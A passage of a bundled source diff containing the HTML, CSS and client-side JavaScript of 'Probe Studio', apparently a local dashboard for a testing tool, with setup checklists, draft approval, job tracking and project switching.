class="pill warn" style="font-size:10px">new</span>` : ""}</label>`;\n  const group = (kind, label, hint) => {\n    const list = k.proposed.filter((a) => a.kind === kind);\n    return list.length ? `<div class="k" style="margin-top:10px">${label} (${list.length})${hint ? ` <span class="muted" style="font-weight:400">\xB7 ${hint}</span>` : ""}</div>\n      <div class="row" style="flex-wrap:wrap;gap:4px 14px;margin:6px 0">${list.map(box).join("")}</div>` : "";\n  };\n  return `${group("feature", "Features to give a manifest", "")}\n    ${group("platform", "Platform areas to give a manifest", "shared code (core, common, the app module); its rules are proven by unit tests, and an edit in it marks the areas using it stale")}\n    <div class="row"><button class="btn" id="initchoose">Use the ticked ones</button>${k.proposed.some((a) => a.kind === "platform") ? `<button class="btn secondary" id="initplatform">Tick all platform areas</button>` : ""}<button class="btn secondary" id="initnone">Untick all</button></div>`;\n}\n\n/** `probe init` as a checklist: each step, the features to choose, and the drafts to review. */\nasync function renderInit(el) {\n  const k = await api("/api/init");\n  const open = k.steps.filter((s) => s.status === "todo" || s.status === "waiting");\n  const features = k.steps.find((s) => s.id === "features");\n  el.innerHTML = `<div class="box"><div class="row" style="flex-wrap:wrap"><h3 style="margin:0">${open.length ? `Feature knowledge: ${open.length} step${open.length === 1 ? "" : "s"} left` : "Feature knowledge: set up"}</h3><div style="flex:1"></div>\n      ${open.some((s) => s.status === "todo") ? `<button class="btn" id="initrun" ${k.running ? "disabled" : ""}>${k.running ? "Running\u2026" : "\u25B6 Run the next steps"}</button>` : ""}</div>\n    <p class="muted" style="margin:6px 0 0">The same steps as <code class="mono">probe init</code>. Each reads where the project stands, so running it again carries on and never redoes finished work. Manifests, card links and the agent file arrive below as drafts: nothing lands until you apply it, and nothing is committed.</p>\n    <ul class="setup">${k.steps.map((s) => `<li><span class="pill ${INIT_PILL[s.status][0]}">${INIT_PILL[s.status][1]}</span>\n      <div class="what"><strong>${esc(s.label)}</strong><div class="muted">${esc(s.detail)}</div></div>\n      ${s.status === "todo" && INIT_RUNNABLE.has(s.id) && !k.running ? `<button class="btn secondary" data-initstep="${s.id}">Run</button>` : ""}</li>`).join("")}</ul>\n    ${features.status === "waiting" && k.proposed.length ? areaPicker(k) : ""}\n  </div>\n  <div id="initpanel"></div>\n  ${k.drafts.map((d) => `<div class="box stale"><h3>${d.step === "agentfile" ? "Agent file" : d.step === "cards" ? `Cards for ${esc(d.feature)}` : `Manifest for ${esc(d.feature)}`} <span class="muted" style="font-weight:400">\xB7 drafted ${ago(d.createdAt)}</span></h3>\n      <p style="margin:4px 0 8px;white-space:pre-wrap">${esc(d.summary)}</p>\n      ${d.diffs.map((x) => `<div class="mono muted">${esc(x.path)}${x.conflict ? ` <span class="pill fail">changed since the draft was made</span>` : ""}</div>${diffHtml(x.diff)}`).join("")}\n      <div class="row"><button class="btn" data-iapprove="${esc(d.id)}" ${d.diffs.some((x) => x.conflict) ? "disabled" : ""}>Apply</button><button class="btn secondary" data-ireject="${esc(d.id)}">Reject</button></div></div>`).join("")}`;\n\n  const start = async (body) => {\n    const res = await post("/api/init/run", body);\n    if (res.error) return alert(res.error);\n    el.querySelectorAll("#initrun,[data-initstep]").forEach((b) => (b.disabled = true));\n    followRun(res.runId, document.getElementById("initpanel"), () => renderInit(el));\n  };\n  el.querySelector("#initrun")?.addEventListener("click", () => start({}));\n  el.querySelectorAll("[data-initstep]").forEach((b) => b.addEventListener("click", () => start({ step: b.dataset.initstep })));\n  el.querySelector("#initnone")?.addEventListener("click", () => el.querySelectorAll("[data-feat]:not(:disabled)").forEach((c) => (c.checked = false)));\n  el.querySelector("#initplatform")?.addEventListener("click", () => el.querySelectorAll(\'[data-feat][data-kind="platform"]\').forEach((c) => (c.checked = true)));\n  el.querySelector("#initchoose")?.addEventListener("click", async () => {\n    const chosen = [...el.querySelectorAll("[data-feat]")].filter((c) => c.checked).map((c) => c.dataset.feat);\n    if (!chosen.length) return alert("Tick at least one feature or platform area.");\n    const res = await post("/api/init/features", { features: chosen });\n    if (res.error) return alert(res.error);\n    renderInit(el);\n  });\n  el.querySelectorAll("[data-iapprove],[data-ireject]").forEach((b) => b.addEventListener("click", async () => {\n    const approve = !!b.dataset.iapprove;\n    const id = b.dataset.iapprove || b.dataset.ireject;\n    if (approve && !confirm("Write this draft into the project? Nothing is committed.")) return;\n    b.disabled = true;\n    const res = await post(`/api/drafts/${encodeURIComponent(id)}/${approve ? "approve" : "reject"}`, {});\n    if (!res.ok) alert(res.error);\n    renderInit(el);\n  }));\n  if (k.running) followRun(k.running, document.getElementById("initpanel"), () => renderInit(el));\n}\n\nasync function renderSetup() {\n  $view.innerHTML = `<div class="empty">Checking this project\u2026</div>`;\n  const items = await api("/api/setup");\n  const left = items.filter((i) => i.status !== "ok").length;\n  $view.innerHTML = `<div id="initwrap"></div><div class="box"><h3>${left ? `Device testing: ${left} thing${left === 1 ? "" : "s"} left to set up` : "Device testing: ready"}</h3>\n    <p class="muted" style="margin-top:0">Probe finds what it can on its own; anything it guessed is marked and can be changed in Settings. Nothing here needs a file edited by hand.</p>\n    <ul class="setup">${items.map((i) => `<li><span class="pill ${i.status}">${STATUS_ICON[i.status]}</span>\n      <div class="what"><strong>${esc(i.label)}</strong><div class="muted">${esc(i.detail)}</div></div>\n      ${i.action && i.status !== "ok" ? `<button class="btn secondary" data-go="${i.action.tab}">${esc(i.action.label)}</button>` : ""}</li>`).join("")}</ul></div>`;\n  $view.insertAdjacentHTML("beforeend", `<div id="docwrap"></div>`);\n  $view.querySelectorAll("button[data-go]").forEach((b) => b.addEventListener("click", () => { state.tab = b.dataset.go; render(); }));\n  renderDoctor(document.getElementById("docwrap"));\n  renderInit(document.getElementById("initwrap"));\n}\n\n// Links inside the page (#setup, #runs/<id>) go where they say; saveRoute\'s replaceState does not fire this.\nwindow.addEventListener("hashchange", () => { if (loadRoute()) render(); });\ndocument.addEventListener("keydown", (e) => {\n  if (e.key === "Escape" && state.tab === "runs" && runsState().selected && !e.target.closest?.("input, textarea, select")) closeRun();\n});\n\n(async () => {\n  await Promise.all([checkBranch(), refreshJobs()]);\n  // Back where the page was; else on work still going; else a project that cannot be tested\n  // yet opens on what is missing.\n  if (loadRoute()) return render();\n  const latest = state.jobs[state.jobs.length - 1];\n  if (latest) {\n    goTo(routeOf(latest));\n    state.followId = latest.runId;\n    return render();\n  }\n  const [items, init] = await Promise.all([api("/api/setup").catch(() => []), api("/api/init").catch(() => null)]);\n  const knowledgeOpen = init && init.steps.some((s) => ["features", "manifests"].includes(s.id) && s.status !== "done");\n  if (items.some((i) => i.status === "fail") || knowledgeOpen) state.tab = "setup";\n  render();\n})();\n</script>\n</body>\n</html>\n';
+var page_default = '<!doctype html>\n<html lang="en">\n<head>\n<meta charset="utf-8">\n<meta name="viewport" content="width=device-width, initial-scale=1">\n<title>Probe Studio</title>\n<style>\n  :root {\n    --bg: #f7f7f5; --panel: #ffffff; --text: #1d1d1b; --muted: #6b6b66; --line: #e4e4df;\n    --accent: #3b5bdb; --ok: #2f9e44; --warn: #e8890c; --fail: #e03131; --track: #ececE7;\n    --mono: ui-monospace, SFMono-Regular, Consolas, monospace;\n  }\n  @media (prefers-color-scheme: dark) {\n    :root {\n      --bg: #141413; --panel: #1d1d1b; --text: #ececE7; --muted: #9a9a93; --line: #2e2e2b;\n      --accent: #748ffc; --ok: #51cf66; --warn: #ffa94d; --fail: #ff6b6b; --track: #2a2a27;\n    }\n  }\n  * { box-sizing: border-box; }\n  body { margin: 0; background: var(--bg); color: var(--text); font: 14px/1.45 system-ui, -apple-system, "Segoe UI", sans-serif; }\n  header { display: flex; align-items: center; gap: 16px; padding: 14px 24px; border-bottom: 1px solid var(--line); background: var(--panel); position: sticky; top: 0; z-index: 2; }\n  header h1 { font-size: 16px; margin: 0; letter-spacing: .2px; }\n  header .meta { color: var(--muted); font-size: 12px; }\n  header select.proj { font-weight: 600; max-width: 240px; padding: 3px 6px; }\n  header .spacer { flex: 1; }\n  nav { display: flex; gap: 4px; }\n  nav button { background: none; border: 0; padding: 6px 12px; border-radius: 6px; color: var(--muted); cursor: pointer; font: inherit; }\n  nav button.active { background: var(--track); color: var(--text); font-weight: 600; }\n  main { padding: 20px 24px; max-width: 1280px; margin: 0 auto; }\n  .btn { background: var(--accent); color: #fff; border: 0; border-radius: 6px; padding: 7px 14px; font: inherit; font-weight: 600; cursor: pointer; }\n  .btn.secondary { background: var(--track); color: var(--text); }\n  .btn:disabled { opacity: .5; cursor: default; }\n  .btn.stop { background: var(--fail); padding: 3px 12px; font-size: 13px; }\n  .toolbar { display: flex; gap: 10px; align-items: center; margin-bottom: 14px; flex-wrap: wrap; }\n  form.acct { display: grid; grid-template-columns: repeat(auto-fit, minmax(160px, 1fr)); gap: 10px; align-items: end; background: var(--panel); border: 1px solid var(--line); border-radius: 10px; padding: 14px; margin-top: 16px; }\n  form.acct label { display: grid; gap: 4px; font-size: 12px; color: var(--muted); font-weight: 600; }\n  form.acct input { padding: 7px 10px; border: 1px solid var(--line); border-radius: 6px; background: var(--bg); color: var(--text); font: inherit; min-width: 0; }\n  input[type=search] { padding: 7px 10px; border: 1px solid var(--line); border-radius: 6px; background: var(--panel); color: var(--text); font: inherit; min-width: 220px; }\n  .seg { display: inline-flex; border: 1px solid var(--line); border-radius: 6px; overflow: hidden; }\n  .seg button { background: var(--panel); border: 0; padding: 6px 12px; color: var(--muted); cursor: pointer; font: inherit; }\n  .seg button.active { background: var(--track); color: var(--text); font-weight: 600; }\n  .cards { display: grid; grid-template-columns: repeat(auto-fit, minmax(150px, 1fr)); gap: 12px; margin-bottom: 18px; }\n  .card { background: var(--panel); border: 1px solid var(--line); border-radius: 10px; padding: 12px 14px; }\n  .card .k { color: var(--muted); font-size: 12px; }\n  .card .v { font-size: 22px; font-weight: 650; margin-top: 2px; }\n  table { width: 100%; border-collapse: collapse; background: var(--panel); border: 1px solid var(--line); border-radius: 10px; overflow: hidden; }\n  th, td { text-align: left; padding: 8px 12px; border-bottom: 1px solid var(--line); vertical-align: middle; }\n  th { font-size: 12px; color: var(--muted); font-weight: 600; background: var(--panel); }\n  td.num, th.num { text-align: right; font-variant-numeric: tabular-nums; }\n  tbody tr:last-child td { border-bottom: 0; }\n  tr.click { cursor: pointer; }\n  tr.click:hover td { background: var(--track); }\n  .bar { display: flex; height: 8px; width: 140px; border-radius: 4px; overflow: hidden; background: var(--track); }\n  .bar span { display: block; height: 100%; }\n  .pill { display: inline-block; padding: 1px 8px; border-radius: 999px; font-size: 12px; font-weight: 600; }\n  .pill.ok { color: var(--ok); background: color-mix(in srgb, var(--ok) 14%, transparent); }\n  .pill.fail, .pill.failed, .pill.error { color: var(--fail); background: color-mix(in srgb, var(--fail) 14%, transparent); }\n  .pill.warn, .pill.running, .pill.blocked { color: var(--warn); background: color-mix(in srgb, var(--warn) 14%, transparent); }\n  .pill.passed { color: var(--ok); background: color-mix(in srgb, var(--ok) 14%, transparent); }\n  .pill.none, .pill.skipped, .pill.unknown, .pill.stopped { color: var(--muted); background: var(--track); }\n  .pill.h-ok { color: var(--ok); background: color-mix(in srgb, var(--ok) 14%, transparent); }\n  .pill.h-warn { color: var(--warn); background: color-mix(in srgb, var(--warn) 14%, transparent); }\n  .pill.h-fail { color: var(--fail); background: color-mix(in srgb, var(--fail) 14%, transparent); }\n  .pill.h-unknown { color: var(--muted); background: var(--track); }\n  .map { display: grid; grid-template-columns: repeat(auto-fill, minmax(170px, 1fr)); gap: 10px; }\n  .tile { background: var(--panel); border: 1px solid var(--line); border-left: 5px solid var(--track); border-radius: 10px; padding: 10px 12px; cursor: pointer; min-height: 86px; }\n  .tile:hover { background: var(--track); }\n  .tile.h-ok { border-left-color: var(--ok); } .tile.h-warn { border-left-color: var(--warn); } .tile.h-fail { border-left-color: var(--fail); }\n  .tile strong { display: block; margin-bottom: 4px; overflow-wrap: anywhere; }\n  .tile .sig { display: flex; gap: 6px; flex-wrap: wrap; font-size: 11px; color: var(--muted); }\n  .tile .why { font-size: 11px; color: var(--muted); margin-top: 4px; }\n  .box { background: var(--panel); border: 1px solid var(--line); border-radius: 10px; padding: 12px 14px; margin-bottom: 14px; }\n  .box h3 { font-size: 13px; margin: 0 0 8px; }\n  .box ul { margin: 4px 0; padding-left: 18px; }\n  form.inline { display: flex; gap: 10px; flex-wrap: wrap; align-items: end; }\n  form.inline label { display: grid; gap: 4px; font-size: 12px; color: var(--muted); font-weight: 600; }\n  form.inline input, form.inline textarea, form.inline select { padding: 7px 10px; border: 1px solid var(--line); border-radius: 6px; background: var(--bg); color: var(--text); font: inherit; }\n  form.inline label.check { display: flex; gap: 6px; align-items: center; font-weight: 400; color: var(--text); font-size: 13px; }\n  textarea { width: 100%; min-height: 90px; resize: vertical; }\n  .muted { color: var(--muted); }\n  .mono { font-family: var(--mono); font-size: 12px; }\n  td.mono { word-break: break-all; }\n  h2 { font-size: 15px; margin: 22px 0 10px; }\n  .back { background: none; border: 0; color: var(--accent); cursor: pointer; font: inherit; padding: 0; margin-bottom: 10px; }\n  pre.log { background: #0f0f0e; color: #d8d8d2; padding: 12px; border-radius: 10px; max-height: 360px; overflow: auto; font: 12px/1.4 var(--mono); white-space: pre-wrap; margin: 0; }\n  .legend { display: flex; gap: 14px; font-size: 12px; color: var(--muted); }\n  .dot { display: inline-block; width: 9px; height: 9px; border-radius: 2px; margin-right: 5px; vertical-align: -1px; }\n  .empty { padding: 30px; text-align: center; color: var(--muted); }\n  .row { display: flex; gap: 12px; align-items: center; }\n  .shots { display: flex; gap: 10px; overflow-x: auto; padding: 6px 0; }\n  .shots figure { margin: 0; flex: 0 0 auto; width: 150px; }\n  .shots img { width: 150px; border-radius: 8px; border: 1px solid var(--line); display: block; }\n  .shots figcaption { font-size: 11px; color: var(--muted); margin-top: 4px; }\n  details.fc { background: var(--panel); border: 1px solid var(--line); border-radius: 10px; margin-bottom: 8px; }\n  details.fc > summary { display: flex; gap: 10px; align-items: center; padding: 10px 14px; cursor: pointer; list-style: none; flex-wrap: wrap; }\n  details.fc > summary::-webkit-details-marker { display: none; }\n  details.fc[open] > summary { border-bottom: 1px solid var(--line); }\n  .fc-body { padding: 4px 16px 14px; }\n  .fc-body .k { color: var(--muted); font-size: 12px; font-weight: 600; margin-top: 10px; }\n  .fc-body ul, .fc-body ol { margin: 4px 0; padding-left: 20px; }\n  .fc-body ul.expect { list-style: none; padding-left: 0; }\n  .fc-body ul.expect li { margin: 3px 0; }\n  .reach { display: flex; flex-wrap: wrap; gap: 6px; align-items: center; margin: 6px 0; }\n  .reach span { background: var(--track); padding: 2px 8px; border-radius: 6px; font-size: 13px; }\n  .reach b { color: var(--muted); font-weight: 400; }\n  .pill.lvl-feature { color: var(--accent); background: color-mix(in srgb, var(--accent) 14%, transparent); }\n  .pill.lvl-capability { color: var(--text); background: var(--track); }\n  .pill.lvl-regression { color: var(--fail); background: color-mix(in srgb, var(--fail) 12%, transparent); }\n  .pill.conf-high, .pill.st-approved { color: var(--ok); background: color-mix(in srgb, var(--ok) 14%, transparent); }\n  .pill.conf-medium, .pill.st-draft { color: var(--warn); background: color-mix(in srgb, var(--warn) 14%, transparent); }\n  .pill.sev-critical { color: #fff; background: var(--fail); }\n  .pill.sev-high { color: var(--fail); background: color-mix(in srgb, var(--fail) 14%, transparent); }\n  .pill.sev-medium { color: var(--warn); background: color-mix(in srgb, var(--warn) 14%, transparent); }\n  .pill.sev-low, .pill.sev-info { color: var(--muted); background: var(--track); }\n  .pill.conf-low, .pill.st-rejected { color: var(--fail); background: color-mix(in srgb, var(--fail) 14%, transparent); }\n  .branch { font-size: 12px; padding: 3px 10px; border-radius: 999px; background: var(--track); white-space: nowrap; cursor: pointer; border: 0; color: inherit; font: inherit; font-size: 12px; max-width: 280px; overflow: hidden; text-overflow: ellipsis; }\n  .bwrap { position: relative; }\n  .bpop { position: absolute; top: calc(100% + 6px); left: 0; z-index: 5; width: 340px; max-width: calc(100vw - 32px); background: var(--panel); border: 1px solid var(--line); border-radius: 8px; box-shadow: 0 8px 24px rgba(0,0,0,.15); padding: 8px; }\n  .bpop input { width: 100%; box-sizing: border-box; padding: 6px 9px; border: 1px solid var(--line); border-radius: 6px; background: var(--bg); color: var(--text); font: inherit; font-size: 13px; }\n  .blist { max-height: 320px; overflow-y: auto; margin-top: 6px; }\n  .blist button { display: block; width: 100%; text-align: left; padding: 5px 8px; border: 0; border-radius: 5px; background: none; color: inherit; font: inherit; font-size: 13px; cursor: pointer; overflow: hidden; text-overflow: ellipsis; white-space: nowrap; }\n  .blist button:hover, .blist button.on { background: var(--track); }\n  .blist .cur { font-weight: 600; }\n  .blist .none { color: var(--muted); font-size: 12px; padding: 6px 8px; }\n  .branch.warn { color: var(--warn); background: color-mix(in srgb, var(--warn) 14%, transparent); }\n  .jobs { font: inherit; font-size: 12px; padding: 3px 10px; border: 0; border-radius: 999px; cursor: pointer; white-space: nowrap; color: var(--warn); background: color-mix(in srgb, var(--warn) 14%, transparent); }\n  .jobs[hidden] { display: none; }\n  .banner { background: color-mix(in srgb, var(--fail) 12%, var(--panel)); border-bottom: 1px solid var(--fail); padding: 10px 24px; display: flex; gap: 12px; align-items: center; flex-wrap: wrap; }\n  .banner.warn { background: color-mix(in srgb, var(--warn) 12%, var(--panel)); border-bottom-color: var(--warn); }\n  ul.setup { list-style: none; padding: 0; margin: 0; }\n  ul.setup li { display: flex; gap: 12px; align-items: center; padding: 10px 0; border-bottom: 1px solid var(--line); flex-wrap: wrap; }\n  ul.setup li:last-child { border-bottom: 0; }\n  ul.setup .what { flex: 1; min-width: 200px; }\n  .src { font-size: 11px; color: var(--muted); font-weight: 400; }\n  .split { display: grid; grid-template-columns: 270px minmax(0, 1fr); gap: 16px; align-items: start; }\n  .side { position: sticky; top: 70px; background: var(--panel); border: 1px solid var(--line); border-radius: 10px; max-height: calc(100vh - 90px); display: flex; flex-direction: column; }\n  .side .head { padding: 10px; border-bottom: 1px solid var(--line); display: grid; gap: 8px; }\n  .side .head input { width: 100%; min-width: 0; }\n  .side .chips { display: flex; flex-wrap: wrap; gap: 4px; }\n  .chip { border: 1px solid var(--line); background: var(--panel); color: var(--muted); border-radius: 999px; padding: 2px 10px; font: inherit; font-size: 12px; cursor: pointer; }\n  .chip.active { background: var(--track); color: var(--text); font-weight: 600; }\n  .side ul { list-style: none; margin: 0; padding: 4px; overflow: auto; }\n  .side li { display: flex; gap: 8px; align-items: center; padding: 6px 8px; border-radius: 6px; cursor: pointer; }\n  .side li:hover { background: var(--track); }\n  .side li.active { background: color-mix(in srgb, var(--accent) 14%, transparent); font-weight: 600; }\n  .side li .name { flex: 1; overflow: hidden; text-overflow: ellipsis; white-space: nowrap; }\n  .side li .n { font-size: 11px; color: var(--muted); font-variant-numeric: tabular-nums; }\n  .side li .d { width: 8px; height: 8px; border-radius: 50%; background: var(--track); flex: 0 0 auto; }\n  .side li .d.fail { background: var(--fail); } .side li .d.draft { background: var(--warn); } .side li .d.ok { background: var(--ok); }\n  .issues { margin: 12px 0; }\n  .issue { display: flex; gap: 10px; align-items: center; flex-wrap: wrap; padding: 8px 0; border-bottom: 1px solid var(--line); }\n  .issue:last-child { border-bottom: 0; }\n  .issue .what { flex: 1; min-width: 220px; }\n  .issue .k { font-size: 11px; }\n  textarea.prompt { font: 12px/1.4 var(--mono); min-height: 220px; margin-top: 8px; }\n  pre.diff { background: var(--bg); border: 1px solid var(--line); border-radius: 8px; padding: 10px; max-height: 420px; overflow: auto; font: 12px/1.45 var(--mono); margin: 6px 0; white-space: pre-wrap; }\n  pre.diff .add { color: var(--ok); } pre.diff .del { color: var(--fail); } pre.diff .hunk { color: var(--muted); }\n  .glance { font-size: 13px; } .glance ul { margin: 4px 0; padding-left: 18px; } .glance code { font-family: var(--mono); font-size: 12px; background: var(--track); padding: 0 4px; border-radius: 4px; }\n  .box.stale { border-color: var(--warn); }\n  .box a { color: var(--accent); font-weight: 600; }\n  /* Runs: the list on the left, the selected run beside it, each with its own scroll. */\n  .runs-layout { display: grid; grid-template-columns: minmax(0, 1fr) minmax(0, 1.2fr); gap: 16px; align-items: start; }\n  .runs-list .filters { display: flex; gap: 8px; flex-wrap: wrap; align-items: center; margin-bottom: 10px; }\n  .runs-list .filters select, .runs-list .filters input { font: inherit; font-size: 13px; padding: 4px 8px; border: 1px solid var(--line); border-radius: 8px; background: var(--panel); color: var(--text); }\n  .runs-list .filters input { flex: 1 1 160px; min-width: 0; }\n  .runs-list .count { color: var(--muted); font-size: 12px; margin: 8px 2px; display: flex; justify-content: space-between; align-items: center; gap: 8px; }\n  .runs-list td.res { overflow-wrap: anywhere; }\n  tr.click.sel td { background: color-mix(in srgb, var(--accent) 12%, transparent); }\n  tr.click.sel td:first-child { box-shadow: inset 3px 0 0 var(--accent); }\n  .runs-detail { position: sticky; top: 12px; max-height: calc(100vh - 24px); overflow: auto; background: var(--panel); border: 1px solid var(--line); border-radius: 10px; padding: 12px 16px; }\n  .runs-detail .dhead { display: flex; justify-content: flex-end; gap: 8px; position: sticky; top: -12px; background: var(--panel); padding: 4px 0; z-index: 1; }\n  .runs-detail h2 { font-size: 16px; margin: 0 0 8px; overflow-wrap: anywhere; }\n  .runs-detail .empty { padding: 40px 12px; }\n  @media (max-width: 1100px) {\n    .runs-layout { grid-template-columns: 1fr; }\n    .runs-detail { display: none; }\n    .runs-detail.open { display: block; position: fixed; inset: 0; z-index: 30; max-height: none; border-radius: 0; border: 0; }\n  }\n  @media (max-width: 860px) { .split { grid-template-columns: 1fr; } .side { position: static; max-height: 320px; } }\n  @media (max-width: 720px) {\n    header { flex-wrap: wrap; padding: 12px 16px; }\n    main { padding: 16px; }\n    .hide-sm { display: none; }\n    table { font-size: 13px; }\n  }\n</style>\n</head>\n<body>\n<header>\n  <h1>Probe</h1>\n  <select class="proj" id="proj" title="Project Studio shows: switch to another one Probe knows, or open a folder"></select>\n  <div class="meta" id="meta">loading\u2026</div>\n  <div class="bwrap"><button class="branch" id="branch" title="Branch this project is on">\u2026</button>\n    <div class="bpop" id="bpop" hidden><input id="bq" placeholder="Search branches\u2026" autocomplete="off"><div class="blist" id="blist"></div></div></div>\n  <button class="jobs" id="jobs" hidden></button>\n  <div class="spacer"></div>\n  <nav>\n    <button data-tab="atlas" class="active">Atlas</button>\n    <button data-tab="cards">Cards</button>\n    <button data-tab="verify">Verify</button>\n    <button data-tab="security">Security</button>\n    <button data-tab="runs">Runs</button>\n    <button data-tab="settings">Settings</button>\n    <button data-tab="setup">Setup</button>\n  </nav>\n</header>\n<div id="banner"></div>\n<main id="view"></main>\n\n<script>\nconst $view = document.getElementById("view");\nconst $meta = document.getElementById("meta");\nconst state = { tab: "atlas", scan: null, filter: "", group: "feature", view: "table", feature: null, eventSource: null, jobs: [] };\n\nconst api = (path, opts) => fetch(path, opts).then((r) => r.json());\nconst esc = (s) => String(s ?? "").replace(/[&<>"]/g, (c) => ({ "&": "&amp;", "<": "&lt;", ">": "&gt;", \'"\': "&quot;" })[c]);\nconst ago = (iso) => {\n  if (!iso) return "never";\n  const s = (Date.now() - new Date(iso).getTime()) / 1000;\n  if (s < 60) return "just now";\n  if (s < 3600) return Math.round(s / 60) + "m ago";\n  if (s < 86400) return Math.round(s / 3600) + "h ago";\n  return Math.round(s / 86400) + "d ago";\n};\n\ndocument.querySelectorAll("nav button").forEach((b) => b.addEventListener("click", () => {\n  state.tab = b.dataset.tab; state.feature = null; render();\n}));\n\n// \u2500\u2500 Project: Studio shows one at a time; the picker switches to any project Probe knows \u2500\u2500\n\nconst OPEN_OTHER = "__open_folder__";\n\nasync function loadProjects() {\n  const data = await api("/api/projects").catch(() => null);\n  if (!data) return;\n  const sel = document.getElementById("proj");\n  sel.innerHTML = data.projects.map((p) => `<option value="${esc(p.root)}" title="${esc(p.root)}" ${p.root === data.current.root ? "selected" : ""}>${esc(p.name)}</option>`).join("") +\n    `<option value="${OPEN_OTHER}">Open another folder\u2026</option>`;\n  sel.dataset.current = data.current.root;\n}\n\ndocument.getElementById("proj").addEventListener("change", async (e) => {\n  const sel = e.target;\n  let root = sel.value;\n  if (root === OPEN_OTHER) {\n    root = (prompt("Project folder (full path):") || "").trim();\n    if (!root) { sel.value = sel.dataset.current; return; }\n  }\n  const running = state.jobs.length;\n  if (running && !confirm(`${running} run${running === 1 ? " is" : "s are"} still going in this project. They keep running; switch anyway?`)) { sel.value = sel.dataset.current; return; }\n  sel.disabled = true;\n  const res = await post("/api/projects/open", { root });\n  sel.disabled = false;\n  if (res.error) { alert(res.error); sel.value = sel.dataset.current; return; }\n  // Everything on the page belonged to the old project.\n  closeStream();\n  Object.assign(state, { tab: "atlas", scan: null, feature: null, branchSeen: null, branchList: null, cardFilter: null, runs: null, verify: null, jobs: [] });\n  history.replaceState(null, "", "#atlas");\n  document.getElementById("banner").innerHTML = "";\n  await loadProjects();\n  if (typeof checkBranch === "function") checkBranch();\n  render();\n});\n\nloadProjects();\n\nfunction closeStream() { if (state.eventSource) { state.eventSource.close(); state.eventSource = null; } }\n\nasync function render() {\n  closeStream();\n  document.querySelectorAll("nav button").forEach((b) => b.classList.toggle("active", b.dataset.tab === state.tab));\n  saveRoute();\n  if (state.tab === "setup") await renderSetup();\n  else if (state.tab === "atlas") await (state.feature ? renderFeature(state.feature) : renderAtlas());\n  else if (state.tab === "cards") await renderCards();\n  else if (state.tab === "verify") await renderVerify();\n  else if (state.tab === "security") await renderSecurity();\n  else if (state.tab === "runs") await renderRuns();\n  else if (state.tab === "settings") await renderSettings();\n  showJobs();\n}\n\n// \u2500\u2500 Where the page is, in the address, so a reopened tab comes back to it \u2500\u2500\n\nfunction saveRoute() {\n  const sub = state.tab === "atlas" ? state.feature : state.tab === "cards" ? state.cardFilter?.feature : state.tab === "runs" ? state.runs?.selected : null;\n  history.replaceState(null, "", "#" + state.tab + (sub ? "/" + encodeURIComponent(sub) : ""));\n}\n\nfunction loadRoute() {\n  const m = /^#(atlas|cards|verify|security|runs|settings|setup)(?:\\/(.+))?$/.exec(location.hash);\n  if (!m) return false;\n  goTo({ tab: m[1], feature: m[2] ? decodeURIComponent(m[2]) : null });\n  return true;\n}\n\nfunction goTo(route) {\n  state.tab = route.tab;\n  state.feature = route.tab === "atlas" ? route.feature || null : null;\n  if (route.tab === "runs") runsState().selected = route.feature || null;\n  if (route.tab === "cards" && route.feature) state.cardFilter = { side: "all", q: "", level: "all", status: "all", ...state.cardFilter, feature: route.feature };\n}\n\n// \u2500\u2500 Jobs: work the server is doing (drafting cards, unit runs, verify\u2026), whoever started it \u2500\u2500\n// The server is the record. A page opened mid-run asks for it, marks the buttons that started\n// it as busy and follows the run, so closing the tab never hides work that is still going.\n\n/** The same keys as the server\'s jobKeys (src/studio/jobs.ts). */\nconst jobKey = {\n  unit: (f) => `unit:${f}`,\n  backfill: (f) => `backfill:${f}`,\n  explore: (f) => `explore:${f}`,\n  unitwrite: (f) => `unitwrite:${f}`,\n  card: (f, id) => `card:${f}/${id}`,\n  login: (role) => `login:${role || "check"}`,\n  security: (f) => `security:${f || "*"}`,\n  verifyFeatures: (fs) => `verify:features:${[...fs].sort().join(",")}`,\n  verifyOutdated: (fs) => `verify:outdated${fs && fs.length ? ":" + [...fs].sort().join(",") : ""}`,\n  verifyBase: (base) => `verify:base:${base || ""}`,\n};\n\n/** Where a job\'s button lives, to open the page on it. */\nfunction routeOf(j) {\n  const [kind, ...rest] = j.key.split(":");\n  const arg = rest.join(":");\n  if (kind === "init") return { tab: "setup" };\n  if (kind === "login") return { tab: "settings" };\n  if (kind === "check") return { tab: "atlas" };\n  if (kind === "security") return { tab: "security" };\n  if (kind === "verify") {\n    if (arg === "outdated") return { tab: "atlas" };\n    if (arg.startsWith("outdated:") && !arg.includes(",")) return { tab: "cards", feature: arg.slice(9) };\n    if (arg.startsWith("features:") && !arg.includes(",")) return { tab: "atlas", feature: arg.slice(9) };\n    return { tab: "verify" };\n  }\n  if (kind === "backfill" && arg.startsWith("ticket:")) return { tab: "verify" };\n  if (kind === "backfill" && j.feature === "*") return { tab: "cards" };\n  if (["unit", "backfill", "explore", "unitwrite", "card"].includes(kind) && j.feature !== "*") return { tab: "atlas", feature: j.feature };\n  // The Runs tab opens the run itself beside the list.\n  return { tab: "runs", feature: j.runId };\n}\n\nfunction onRoute(route) {\n  if (route.tab !== state.tab) return false;\n  if (route.tab === "atlas") return (route.feature || null) === state.feature;\n  if (route.tab === "cards") return !route.feature || route.feature === state.cardFilter?.feature;\n  return true;\n}\n\nconst jobLabel = (j) => `${j.kind} ${j.kind === "card" ? `${j.feature}/${j.cardId}` : j.feature === "*" ? "" : j.feature} \xB7 started ${ago(j.startedAt)}`;\n\nasync function refreshJobs() {\n  const jobs = await api("/api/jobs").catch(() => null);\n  if (!jobs) return;\n  state.jobs = jobs.filter((j) => !j.child);\n  showJobs();\n}\n\n/** Reflects the jobs on the page: the header count, busy buttons, and a run to follow. */\nfunction showJobs() {\n  const chip = document.getElementById("jobs");\n  chip.hidden = !state.jobs.length;\n  chip.textContent = `\u25CF ${state.jobs.length} running`;\n  chip.title = state.jobs.map(jobLabel).join("\\n") + "\\nClick to open the latest";\n  const running = new Set(state.jobs.map((j) => j.key));\n  document.querySelectorAll("[data-job]").forEach((b) => {\n    if (b.dataset.label === undefined && !b.disabled) b.dataset.label = b.textContent;\n    if (running.has(b.dataset.job)) {\n      if (b.dataset.marked) return;\n      b.dataset.marked = "1";\n      b.disabled = true;\n      if (b.dataset.busy) b.textContent = b.dataset.busy;\n    } else if (b.dataset.marked) {\n      delete b.dataset.marked;\n      b.disabled = false;\n      if (b.dataset.label !== undefined) b.textContent = b.dataset.label;\n    }\n  });\n  followJob();\n}\n\n/** Into an empty run panel: the run asked for, else the latest job this view started. */\nfunction 